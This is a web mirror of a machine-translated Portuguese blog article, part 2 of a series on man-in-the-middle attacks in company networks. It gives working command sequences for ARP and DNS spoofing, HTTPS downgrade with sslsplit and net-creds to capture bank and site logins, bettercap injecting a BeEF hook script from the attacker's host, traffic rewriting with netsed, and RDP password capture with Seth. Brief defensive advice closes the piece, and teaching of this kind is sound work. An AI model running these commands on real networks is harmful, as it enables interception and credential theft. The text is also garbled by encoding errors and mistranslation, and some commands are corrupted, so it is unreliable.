<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üïû ‚ô¶Ô∏è üë©üèª‚Äçü§ù‚Äçüë®üèø Rede da empresa e MitM. Parte 2 ‚ôÄÔ∏è ‚è∫Ô∏è üõ†Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Interceptar informa√ß√µes confidenciais? Obtenha acesso n√£o autorizado a v√°rios aplicativos e sistemas? Interromper a opera√ß√£o normal? Tudo isso e muito...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Rede da empresa e MitM. Parte 2</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/acribia/blog/461305/"><img src="https://habrastorage.org/webt/od/nu/9e/odnu9ewf9ew8msybaqeimyynca8.png"><br><br>  Interceptar informa√ß√µes confidenciais?  Obtenha acesso n√£o autorizado a v√°rios aplicativos e sistemas?  Interromper a opera√ß√£o normal?  Tudo isso e muito mais realizam ataques como Man in the Middle. <br><br>  Hoje continuamos a s√©rie de artigos dedicados aos ataques do "homem do meio" (e v√°rios outros relacionados) a protocolos e canais de transmiss√£o t√≠picos encontrados em praticamente qualquer empresa.  Considere os n√≠veis de interesse muito maior para o invasor: da rede ao aplicativo. <br><br>  Interessado em?  Bem-vindo ao gato. <br><a name="habracut"></a><br><h3>  Lembre-se </h3><br>  Portanto, no artigo anterior, focamos em ataques de falsifica√ß√£o em ambientes com e sem fio, mostrando t√©cnicas para monitorar solicita√ß√µes e respostas a servidores DNS.  O DNS foi escolhido por um motivo - esse √© um dos principais objetivos.  Porque  Tudo √© simples - quase qualquer sess√£o agora come√ßa com uma solicita√ß√£o do endere√ßo IP do host de destino nos servidores DNS. <br><br>  Hoje vamos mostrar ataques "ao cobre", mas para o mesmo Wi-Fi praticamente nada muda, exceto algumas nuances.  Omitimos a inser√ß√£o na √≥ptica, pois esse vetor de ataques √© muito caro e requer equipamentos especiais. <br><br>  Para come√ßar, estamos interessados ‚Äã‚Äãna intercepta√ß√£o "invis√≠vel" de consultas DNS.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Usarei</a> alguns dos seguintes utilit√°rios: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">DNS2Proxy</a> (o utilit√°rio j√° existe h√° muitos anos, mas ainda est√° pronto para o combate) e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">arpspoof</a> (tamb√©m n√£o √© jovem). <br><br>  Lan√ßamos: <br><br><pre><code class="plaintext hljs"># arpspoof -r 192.168.180.254 192.168.180.1 //  IP ‚Äì  ,  -  # python2 dns2proxy.py -u 192.168.180.253 //  -u   IP-,        # iptables -t nat -A PREROUTING -i enp14s0 ‚Äìp udp --dport 53 -j DNAT --to-destination 192.168.180.253:53</code> </pre> <br>  Agora vamos verificar como isso afeta a m√°quina da v√≠tima, executando nslookup em qualquer dom√≠nio: <br><br> <a href=""><img src="https://habrastorage.org/webt/xn/l6/ek/xnl6ekoftmi1evo5ebyifnh01w4.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/td/bb/wl/tdbbwlw8lohyslxzkbldz6cnngg.jpeg"></a> <br><br>  Bem, a v√≠tima recebe o IP do host exigido pelo invasor, provavelmente o endere√ßo IP local do dispositivo a partir do qual o ataque se desenvolve.  A captura de tela tamb√©m mostra que o cliente acredita que um servidor DNS leg√≠timo responde a ela, o que, √© claro, est√° um pouco errado.  De fato, a funcionalidade do utilit√°rio DNS2Proxy √© bastante ampla: voc√™ pode especificar dom√≠nios espec√≠ficos para falsifica√ß√£o ou, pelo contr√°rio, falsificar tudo, adicionando alguns √†s exce√ß√µes. <br><br>  O que vem a seguir?  E ent√£o precisamos implantar um servidor Web "proxy" que criar√° duas conex√µes: uma √© um "proxy" &lt;&gt; um n√≥ leg√≠timo na rede e o segundo √© uma v√≠tima de "proxy" &lt;&gt;.  Usaremos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">SSLsplit</a> . <br><br>  Lan√ßamos: <br><br><pre> <code class="plaintext hljs"># sslsplit ‚Äìl 2000 # iptables -t nat -A PREROUTING -i enp14s0 ‚Äìp tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.180.253:2000</code> </pre> <br>  Verificamos o que acontecer√° se tentarmos mudar para algum portal automotivo, por exemplo, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">drom.ru</a> : <br><br> <a href=""><img src="https://habrastorage.org/webt/fw/lx/9s/fwlx9svzpbcjr8zhj9bpphumnnw.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/rj/pr/ey/rjpreyx0-d8_un53lczbmvq6x9o.jpeg"></a> <br><br>  E n√≥s temos uma conex√£o desprotegida!  Mas com a ressalva: wwww e webmy.drom.ru foram adicionados como um subdom√≠nio em vez de my.drom.ru.  Vamos tentar fazer login, depois de usar algum utilit√°rio para visualizar o tr√°fego de tr√¢nsito no dispositivo do invasor.  Vou usar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">net-creds</a> .  Vemos o que √© exibido no console: <br><br> <a href=""><img src="https://habrastorage.org/webt/gx/tf/vz/gxtfvz5d7ixeomuz95kn5nplkrm.png"></a> <br><br>  E n√≥s temos um nome de usu√°rio / senha, √≥timo! <br><br>  A quest√£o provavelmente surge: "Qual √© a diferen√ßa com o artigo anterior?"  A diferen√ßa √© que, sem essas manipula√ß√µes, √© criada uma conex√£o HTTPS, o que torna quase imposs√≠vel interceptar contas.  Este √© o chamado "ataque de downgrade". <br><br>  Mesmo assim, funcionar√° mesmo com bancos e outros recursos: <br><br> <a href=""><img src="https://habrastorage.org/webt/rs/lu/od/rsluoddsilfffe7nwpqfl1cydge.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/ku/mh/yk/kumhykptgifo_5x_vw73f8wwsto.jpeg"></a> <br><br>  Mas <b>N√ÉO</b> vale a pena culpar os bancos que, dessa maneira, o usu√°rio pode ser "invadido".  Eles n√£o podem fazer nada aqui, porque o ataque est√° muito al√©m do per√≠metro!  O banco <b>N√ÉO</b> √© o culpado!  Al√©m disso, todos usam o 2FA, o que reduz um pouco o risco de obter acesso. <br><br>  Observe: dessa forma, mesmo o HSTS (HTTP Strict Transport Security) √© ignorado, mas n√£o para todos os recursos (que, eu acho, todos ou quase todos aqui j√° sabem).  V√°rios navegadores mant√™m uma lista de dom√≠nios com os quais a conex√£o via TLS √© necess√°ria, e esse ataque contra eles √© impotente.  O exemplo mais simples √© <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">google.com</a> , e a lista completa do Chromium est√° <a href="https://cs.chromium.org/chromium/src/net/">aqui</a> .  O Firefox e o Chrome / Chromium n√£o criar√£o uma conex√£o HTTP com ele, protegendo o usu√°rio.  No entanto, se um invasor conseguir adicionar de alguma forma o certificado autoassinado "dele" a CAs raiz confi√°veis ‚Äã‚Äãou, pior ainda, confi√°veis, nada ajudar√°, simplesmente porque o navegador e o sistema inicialmente os consideram completamente leg√≠timos e n√£o produzem erros. durante o seu processamento.  O caso das CAs raiz confi√°veis ‚Äã‚Äã√© especial: isso permitir√° que voc√™ gere um certificado para cada dom√≠nio em movimento (√© assim que o DLP e outras ferramentas de prote√ß√£o que analisam o tr√°fego geralmente funcionam), que permite analisar qualquer conex√£o HTTPS sem problemas e notifica√ß√µes do navegador. <br><br>  Todas as ferramentas listadas acima j√° est√£o desatualizadas, pois usam o Python2, cujo suporte ser√° interrompido em breve.  Voc√™ pode usar qualquer anal√≥gico, por exemplo, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">bettercap</a> , que √© um "harvester" de v√°rias ferramentas e executa todas as mesmas fun√ß√µes listadas acima, al√©m de v√°rias outras.  O √∫nico coment√°rio sobre o trabalho dele: as vers√µes mais recentes n√£o querem "resolver" todos os dom√≠nios por padr√£o, √© necess√°rio especificar dom√≠nios espec√≠ficos.  No entanto, para ataques "reais", isso √© suficiente para os olhos e at√© ajuda a n√£o abrir com anteced√™ncia. <br><br>  O que mais o MitM permite?  Importe JS, tamb√©m conhecido como XSS.  E ent√£o um amplo escopo para a criatividade.  Vamos come√ßar a usar bettercap e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">beef</a> : <br><br>  No bettercap incluem: <br><br><pre> <code class="plaintext hljs"># set arp.spoof.targets 192.168.180.254 # arp.spoof on # set http.proxy.sslstrip true # set http.proxy.injectjs http://192.168.180.253:3000/hook.js # http.proxy on</code> </pre> <br>  Se queremos ser implementados nas p√°ginas HTTPS, tamb√©m configuramos o dns.proxy.  Como parte da demonstra√ß√£o, gerenciarei apenas HTTP. <br><br>  V√° para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">diary.ru</a> e observe o seguinte no depurador: <br><br> <a href=""><img src="https://habrastorage.org/webt/mm/rl/ar/mmrlarlqn2ig49fmvrrqltbvwk8.jpeg"></a> <br><br>  Vamos ver como est√£o as coisas na interface da Web da carne de bovino: <br><br> <a href=""><img src="https://habrastorage.org/webt/5o/yt/1z/5oyt1zelqgu7mlv5ztj_csg3gn0.png"></a> <br><br>  Na verdade, terminamos, estamos "no navegador".  2 sess√µes foram criadas, provavelmente devido ao fato de eu ter aberto outra p√°gina em segundo plano, mas isso n√£o √© um problema.  Agora voc√™ pode come√ßar a <s>criar uma confus√£o</s> para coletar informa√ß√µes, desenvolver um ataque, em alguns casos abrir um shell ou simplesmente o meu.  Parte da funcionalidade poss√≠vel √© apresentada na captura de tela na tabela "√Årvore de m√≥dulos".  Para o teste, execute o recebimento da impress√£o digital do navegador: <br><br> <a href=""><img src="https://habrastorage.org/webt/6h/mb/j_/6hmbj_zulrlxccb5gyq2yds-jsa.png"></a> <br><br>  No entanto, os desenvolvedores de navegadores n√£o s√£o est√∫pidos e tentam encobrir v√°rios "buracos" que permitem o acesso com o clique de um dedo.  Por outro lado, esse acesso pode facilitar muito a consolida√ß√£o no host atacado. <br><br>  Vamos seguir para o ataque mais recente de hoje - falsifica√ß√£o de dados.  Em geral, esse ataque se baseia em um artigo separado, ele pode ser usado mesmo ao transferir imagens de m√°quinas virtuais para obter acesso (talvez um dia eu revele esse t√≥pico com mais detalhes), mas agora faremos uma breve demonstra√ß√£o, por exemplo, no site <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">pasted.co</a> - o recurso mais simples, permitindo algum tempo para fornecer acesso a qualquer informa√ß√£o textual.  Para ataque, usamos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">netsed</a> . <br><br>  Lan√ßamos: <br><br><pre> <code class="plaintext hljs"># netsed tcp 4000 0 0 s/Hello/HACKED/o # iptables -t nat -A PREROUTING -i enp14s0 ‚Äìp tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.180.253:4000 # arpspoof -r 192.168.180.254 192.168.180.1</code> </pre> <br>  No n√≥ atacado, v√° para pasted.co, escreva nosso 'Ol√°', envie-o, obtenha um link, abra-o e veja nosso 'HACKED'.  Um exemplo √© simples, mas, penso, imaginar que, em princ√≠pio, √© poss√≠vel implementar um ataque como esse n√£o √© dif√≠cil. <br><br> <a href=""><img src="https://habrastorage.org/webt/kn/6x/ey/kn6xeypuktcczpfa8lywvcsl3gm.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/f_/e6/fo/f_e6fogxo0n7am8oq1kpiblaqow.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/5v/eq/68/5veq68u2vkaj-4gzipx4r96jb9i.jpeg"></a> <br><br><h3>  Algumas palavras sobre RDP e MitM </h3><br>  Existe um utilit√°rio t√£o interessante chamado <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Seth</a> e, de fato, √© um monte de aprspoof e sslstrip, mas para o RDP.  A linha inferior √© simples: ao acessar a porta 3389, o Seth age de maneira semelhante ao sslstrip e cria sua pr√≥pria conex√£o com o n√≥ de destino.  O usu√°rio insere credenciais ... e voc√™ pode terminar a√≠. <br><br>  Lan√ßamos: <br><br><pre> <code class="plaintext hljs"># ./seth.sh enp14s0 192.168.180.253 192.168.180.254 192.168.180.1</code> </pre> <br>  Come√ßamos no cliente RDP, conectamos a qualquer host RDP (eu conectei ao servidor fora da rede 192.168.180.0/24) e entramos na conta.  Pessoalmente, ap√≥s esse est√°gio, eu sempre pegava um erro, embora o utilit√°rio deveria fazer proxy da conex√£o, mas fez a parte mais importante do trabalho: <br><br> <a href=""><img src="https://habrastorage.org/webt/29/ys/iw/29ysiw3wroqids1kqhhmlcjdwj8.png"></a> <br><br>  O ret√¢ngulo destacado tinha uma senha limpa. <br><br><h3>  Nos defender </h3><br><ol><li>  Use todas as medidas indicadas em nosso <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">artigo anterior</a> .  Isso realmente ajuda!  Eu adicionarei separadamente a inclus√£o de espionagem DHCP, que nos permitir√° filtrar servidores DHCP ileg√≠timos, o que pode fazer com que o cliente envie todas as solicita√ß√µes ao host do invasor, evitando a falsifica√ß√£o de arp. </li><li>  Se poss√≠vel, use extens√µes como HTTPS em qualquer lugar.  Ele ser√° redirecionado automaticamente para a vers√£o https do site se ele estiver inclu√≠do em seu banco de dados, o que evita o downgrade de HTTPS. </li><li>  Para o DNS, voc√™ pode usar o DNS sobre TLS / DNS sobre HTTPS ou DNSCrypt.  As ferramentas n√£o s√£o perfeitas, o suporte pode ser bastante doloroso, mas em alguns casos, essa √© uma boa medida de prote√ß√£o. </li><li>  Aprenda e ensine familiares, amigos e colegas a prestar aten√ß√£o na barra de endere√ßos: √© importante!  wwww.drom.ru, as notifica√ß√µes sobre uma conex√£o desprotegida em um recurso anteriormente "livre de problemas" costumam ser um sinal claro de algum tipo de anomalia na rede. </li></ol><br>  Preste aten√ß√£o √†s anomalias nas sess√µes RDP: um certificado alterado inesperadamente √© um mau sinal. <br><br>  Por enquanto √© tudo.  Ou n√£o?  Amigos, gostaria de saber de voc√™, mas voc√™ est√° interessado no ataque ao hipervisor e na migra√ß√£o de m√°quinas?  Ou uma inje√ß√£o nos arquivos PE?  √Ä espera de seus coment√°rios e perguntas! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt461305/">https://habr.com/ru/post/pt461305/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt461289/index.html">Lan√ßamento do CLion 2019.2: suporte ao desenvolvimento incorporado, depurador para MSVC, pesquisa por arquivos de cabe√ßalho n√£o utilizados</a></li>
<li><a href="../pt461291/index.html">Golang: problemas espec√≠ficos de desempenho</a></li>
<li><a href="../pt461297/index.html">Como s√£o os ataques direcionados modernos</a></li>
<li><a href="../pt461299/index.html">Como o PC conquistou a ind√∫stria da m√≠dia com software de sucesso: discutindo o Pro Tools e o Media Composer</a></li>
<li><a href="../pt461303/index.html">Usando o cart√£o Troika como uma ap√≥lice de seguro m√©dico obrigat√≥ria</a></li>
<li><a href="../pt461307/index.html">Convidamos voc√™ para o VK Hackathon 2019. O pr√™mio total deste ano √© de dois milh√µes de rublos.</a></li>
<li><a href="../pt461309/index.html">Tudo, exceto Kotlin: Andrei Breslav sobre o equil√≠brio de g√™nero em TI, emo√ß√µes e muito mais</a></li>
<li><a href="../pt461313/index.html">Lan√ßamento do Zimbra 8.8.15 LTS</a></li>
<li><a href="../pt461317/index.html">9 princ√≠pios para criar aplicativos iOS de qualidade</a></li>
<li><a href="../pt461319/index.html">O que um designer de jogos faz?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>